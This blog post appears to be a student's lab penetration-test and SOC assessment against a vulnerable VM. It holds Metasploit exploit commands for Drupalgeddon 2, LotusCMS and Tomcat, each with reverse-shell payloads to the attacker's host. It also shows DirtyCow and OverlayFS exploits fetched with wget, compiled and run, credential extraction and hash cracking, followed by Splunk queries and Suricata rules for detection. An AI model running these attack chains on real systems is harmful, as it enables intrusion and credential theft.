---
layout: post
title: "OUCSERV1_pentration Test Assessment"
author: Alex Maina Weru
date: 2026-04-28
categories: [Jobs, oucserv1 pentest]
tags: [Dirty cow, FreeBSD, Metasploit, Buffer Overflow, Pentesting]
image:
  path: assets/ouc/oucserv.svg
  alt: kioptrix
---
# OUCSERV1 — Penetration Testing & SOC Assessment

> **Course:** OUCSERV_2025 | **Assessment:** 1  
> **Roles:** Ethical Hacker (Red Team) · Security Engineer (Blue Team / SOC)  
> **Target Environment:** Kali Linux vs. vulnerable VM on `192.168.56.0/24`

---

## Overview

This assessment demonstrates a full-cycle offensive and defensive security engagement. Acting as both a **penetration tester** and a **SOC analyst**, I conducted real-world attacks against a vulnerable virtual machine, then identified, investigated, and wrote custom IDS rules to detect each attack vector.

**Attack vectors covered:**
- SSH brute force (Port 22)
- Drupal CMS Remote Code Execution — Drupalgeddon 2 (CVE-2018-7600)
- LotusCMS Arbitrary Code Execution (Port 80)
- Apache Tomcat WAR file deployment (Port 8080)
- OS Kernel Local Privilege Escalation (DirtyCow / OverlayFS)

---

## Task 1: Red Team — Offensive Operations

### Step 1 — Network Discovery & Connectivity

Before launching any exploit, the target was identified and verified on the local network.

```bash
# Discover live hosts on the subnet
sudo netdiscover -r 192.168.56.0/24


# Target identified: 192.168.56.110
# Verify reachability
ping 192.168.56.110
```
![](/assets/ouc/ouc1.png)

![](/assets/ouc/ouc2.png)

---

### Step 2 — Service Enumeration (Nmap)

A comprehensive Nmap scan was used to fingerprint open ports, services, and the OS.

```bash
nmap -sV -sC -O -A 192.168.56.110
```

| Flag | Purpose |
|------|---------|
| `-sV` | Service/version detection |
| `-sC` | Default NSE script execution |
| `-O`  | OS detection |
| `-A`  | Aggressive (all-in-one) scan |

![](/assets/ouc/ouc3.png)

![](/assets/ouc/ouc4.png)

![](/assets/ouc/ouc5.png)

![](/assets/ouc/ouc6.png)

---

### Step 3 — SSH Brute Force Attack (Port 22)

**Tool:** Hydra — industry-standard parallel brute-force tool supporting multiple protocols.

A wordlist appropriate to the lab environment was supplied to attempt credential stuffing against the SSH service on Port 22.

![](/assets/ouc/ouc41.png)

![](/assets/ouc/ouc42.png)

![](/assets/ouc/ouc43.png)
---

### Step 4 — Drupal RCE via Drupalgeddon 2 (CVE-2018-7600)

#### Reconnaissance & Directory Discovery
![](/assets/ouc/ouc7.png)

![](/assets/ouc/ouc8.png)
```bash
# Locate the Drupal subdirectory
gobuster dir -u http://192.168.56.110/ -w /usr/share/wordlists/dirb/common.txt


# Confirm Drupal version
curl -s http://192.168.56.110/drupal/ | grep -i "generator"


# Search local exploit DB
searchsploit drupal 8.5.0
```
![](/assets/ouc/ouc9.png)

![](/assets/ouc/ouc10.png)

![](/assets/ouc/ouc11.png)

![](/assets/ouc/ouc12.png)

**Finding:** Drupal hosted at `/drupal/`, running a version vulnerable to Drupalgeddon 2.

#### Exploitation — Metasploit Framework

```bash
msfconsole
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.56.110
set TARGETURI /drupal/
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 4445
run

# Stabilise the shell
python -c 'import pty; pty.spawn("/bin/bash")'
```
![](/assets/ouc/ouc13.png)

![](/assets/ouc/ouc14.png)

The exploit injected a payload via the Drupal Form API, causing the server to initiate a reverse TCP connection to the Kali listener.

#### Privilege Escalation — Database Credential Extraction

```bash
# Read Drupal config file
cat sites/default/settings.php
```
![](/assets/ouc/ouc15.png)

**Credentials found in plaintext:**

| Parameter | Value |
|-----------|-------|
| Database  | `drupal` |
| Username  | `root` |
| Password  | `toor` |
| Host      | `localhost` |

```sql
-- Access MySQL and enumerate users
mysql -u root -p   -- password: toor
use drupal;
show tables;
SELECT uid, name, pass FROM users;
```
![](/assets/ouc/ouc16.png)

![](/assets/ouc/ouc17.png)

![](/assets/ouc/ouc18.png)

**Extracted password hashes:**

```
admin:$S$E9E7BByBCbgd2fXU3oloo1yL/K5vO6IyrukpL18YrAL8KdFAsX1o
barra:$S$EA3YI2oocFm0eBA/g8X6pJjD3PBJvt8ly0/DIJUKkeJp9cvlRgIq
```
![](/assets/ouc/ouc19.png)

#### Password Cracking — John the Ripper

```bash
# Save hashes to file, then crack with rockyou wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt --format=Drupal7
```

> The `$S$` prefix indicates Drupal 7 SHA-512-based hashing.

---

### Step 5 — LotusCMS Arbitrary Code Execution (Port 80)

![](/assets/ouc/ouc20.png)

![](/assets/ouc/ouc21.png)

![](/assets/ouc/ouc22.png)

![](/assets/ouc/ouc23.png)
**Vulnerability:** The LotusCMS application unsafely passes URL parameters to PHP's `eval()` function.

```bash
msfconsole
use exploit/multi/http/lcms_php_exec
set RHOSTS 192.168.56.110
set URI /cms/
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 4445
run

# TTY upgrade for a fully interactive shell
python -c 'import pty; pty.spawn("/bin/bash")'
```
![](/assets/ouc/ouc24.png)

**Attack chain summary:**
1. **Vulnerability Exploitation** — `lcms_php_exec` module injects commands via the `eval()` flaw.
2. **Reverse Shell** — Meterpreter payload bypasses inbound firewall rules by initiating an outbound connection.
3. **Shell Access** — Session established under the `www-data` service account.
4. **TTY Stabilisation** — Python PTY upgrade enables interactive commands and privilege escalation.

---

### Step 6 — Apache Tomcat WAR File Deployment (Port 8080)

#### Reconnaissance

```bash
nmap -p 8080 -sV -sC 192.168.56.110
# Finding: Apache Tomcat/Coyote JSP engine 1.1 — /manager interface exposed
```

#### Credential Brute Force

```bash
msfconsole
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS 192.168.56.110
set RPORT 8080
run
# Result: Login Successful — tomcat:tomcat
```
![](/assets/ouc/ouc25.png)

![](/assets/ouc/ouc26.png)
#### WAR Payload Generation & Deployment

```bash
# Phase 1 — Generate the payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f war > shell.war

# Phase 2 — Set up a listener
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD java/jsp_shell_reverse_tcp; \
  set LHOST 192.168.56.101; set LPORT 4444; run"
```

**Phase 3 — Deploy via Browser:**
1. Navigate to `http://192.168.56.110:8080/manager/html`
2. Login with `tomcat / tomcat`
3. Upload `shell.war` via the "WAR file to deploy" section
4. Click `/shell` in the Applications list to trigger the payload

---
![](/assets/ouc/ouc27.png)

![](/assets/ouc/ouc28.png)

![](/assets/ouc/ouc29.png)

![](/assets/ouc/ouc30.png)

![](/assets/ouc/ouc31.png)

![](/assets/ouc/ouc32.png)

### Step 7 — OS Kernel Local Privilege Escalation

**Target kernel:** Linux 3.13.0-32-generic (highly vulnerable)

#### Method A — DirtyCow

```bash
searchsploit -m linux/local/40616.c
python3 -m http.server 8000          # host on Kali

# On target machine:
cd /tmp
wget http://192.168.56.101:8000/40616.c
gcc 40616.c -o dirtycow -pthread
./dirtycow
```
![](/assets/ouc/ouc33.png)

![](/assets/ouc/ouc34.png)

![](/assets/ouc/ouc35.png)
#### Method B — OverlayFS (CVE-2015-1328) *(Preferred for 3.13.x)*

```bash
searchsploit overlayfs
cp /usr/share/exploitdb/exploits/linux/local/37292.c .
python3 -m http.server 80            # host on Kali

# On target machine:
cd /tmp
wget http://192.168.56.101/37292.c
gcc 37292.c -o exploit
./exploit
```
![](/assets/ouc/ouc36.png)

![](/assets/ouc/ouc37.png)

![](/assets/ouc/ouc38.png)

![](/assets/ouc/ouc39.png)

![](/assets/ouc/ouc40.png)
---

## Task 2: Blue Team — SOC Detection & Analysis

### Attack 1 — SSH Brute Force Detection

**Splunk Query:**

```spl
index=* sourcetype=linux_secure "Failed password"
| stats count by src_ip, user, _time
| sort - _time
```

**Signature:** 50+ failed login attempts from `192.168.56.101` within minutes.

![](/assets/ouc/ouc44.png)

![](/assets/ouc/ouc45.png)

---

### Attack 2 — Drupal RCE Detection

**Splunk Query:**

```spl
index=* sourcetype=access_combined uri_path="*/drupal/*" method=POST
```

**Signature:** HTTP `200`/`302` responses following a POST containing PHP code or shell commands via the `element_parents` parameter.

![](/assets/ouc/ouc46.png)

![](/assets/ouc/ouc47.png)

**Evidence Entry:** `2026-04-15 13:17:19`  
**Classification:** Remote Code Execution — Drupalgeddon 2 (CVE-2018-7600)  
**Kill Chain Phase:** Exploitation



---

### Attack 3 — Tomcat File Upload Detection

**Splunk Query:**

```spl
index=* sourcetype="tomcat_access"
```

**Signature:** HTTP `PUT` request with a `.txt` filename — rarely seen in legitimate traffic.

![](/assets/ouc/ouc48.png)

---

### Attack 4 — Reverse Shell / C2 Detection

**Splunk Query:**

```spl
index=* sourcetype=syslog "sh" OR "bash" OR "nc"
```

**Signature:** `www-data` user executing `/bin/sh` or initiating outbound connections to `192.168.56.101`.

```bash
tail -n 50 /var/log/suricata/fast.log | grep "shell"
```

---

### Attack 5 — Privilege Escalation Detection

**Splunk Query:**

```spl
index=main source="/var/log/auth.log"
| table _time, _raw, _clientip
| sort - _time
```

**Key log entry:**

```
sudo root : ... COMMAND=/bin/cat /etc/passwd
```
![](/assets/ouc/ouc49.png)

**Significance:** Confirms "Actions on Objectives" — transition from `admin` to `root`, followed by `/etc/passwd` reconnaissance. This is definitive proof of full system compromise.

> **Note:** Suricata (NIDS) cannot detect local privilege escalation since no network traffic is generated. A **Host-based IDS (HIDS)** such as **Wazuh** or **OSSEC** is required for this detection layer.

---

## Section 3: Custom Suricata IDS Rules

### 3.1 Identified Attack Signatures

| Attack | Indicator |
|--------|-----------|
| SSH Brute Force | High volume of "Failed password" from `192.168.56.101` |
| Drupal RCE | POST requests containing `element_parents` in body |
| Tomcat Exploitation | Unauthorized `PUT` requests uploading `.txt` shells |

### 3.2 Custom Rules — `/etc/suricata/rules/local.rules`

```
# SSH Brute Force
alert tcp 192.168.56.101 any -> $HOME_NET 22 (
  msg:"SSH Brute Force Attempt";
  content:"Failed password";
  sid:1000001;
)

# Drupal RCE — Drupalgeddon 2
alert http 192.168.56.101 any -> $HTTP_SERVERS any (
  msg:"Drupalgeddon 2 RCE Attempt";
  content:"element_parents"; http_client_body;
  sid:1000002;
)

# Tomcat Malicious File Upload
alert http any any -> $HTTP_SERVERS any (
  msg:"Unauthorized Tomcat File Upload";
  content:"PUT"; http_method;
  content:".txt"; http_uri;
  sid:1000003;
)
```
![](/assets/ouc/ouc50.png)

### 3.3 Rule Validation — Confirmed Detections

Suricata successfully flagged:
- **Nmap Scanning** → `ET SCAN Possible Nmap User-Agent Observed` from `192.168.56.101`

![](/assets/ouc/ouc51.png)

- **Kali Fingerprinting** → `ET POLICY Possible Kali Linux hostname in DHCP Request Packet`

![](/assets/ouc/ouc52.png)

### 3.4 Detection Limitations & Recommendations

| Attack Stage | Suricata (NIDS) | Recommended Solution |
|-------------|-----------------|----------------------|
| SSH Brute Force | ✅ Detects | — |
| Drupal RCE | ✅ Detects | — |
| Tomcat Upload | ✅ Detects | — |
| Reverse Shell | ⚠️ Partial | Tune network-layer signatures |
| **Local Privilege Escalation** | ❌ Cannot detect | Deploy **HIDS** (Wazuh / OSSEC) |

> **Recommendation:** Suricata monitors network traffic only. OS-level attacks like DirtyCow and OverlayFS occur entirely within the host via kernel system calls and memory manipulation — producing no network traffic. A HIDS solution monitoring local logs and process behaviour is required for full coverage.

---

## Tools & Technologies Used

| Category | Tools |
|----------|-------|
| Reconnaissance | `nmap`, `netdiscover`, `gobuster`, `searchsploit` |
| Exploitation | Metasploit Framework, `msfvenom`, Hydra |
| Post-Exploitation | Meterpreter, Python PTY, John the Ripper |
| SIEM / Log Analysis | Splunk |
| Network IDS | Suricata |
| Traffic Analysis | Wireshark |
| Privilege Escalation | DirtyCow (`40616.c`), OverlayFS (`37292.c`, CVE-2015-1328) |

---

*Assessment completed as part of OUCSERV_2025. All activities were performed in a controlled lab environment.*
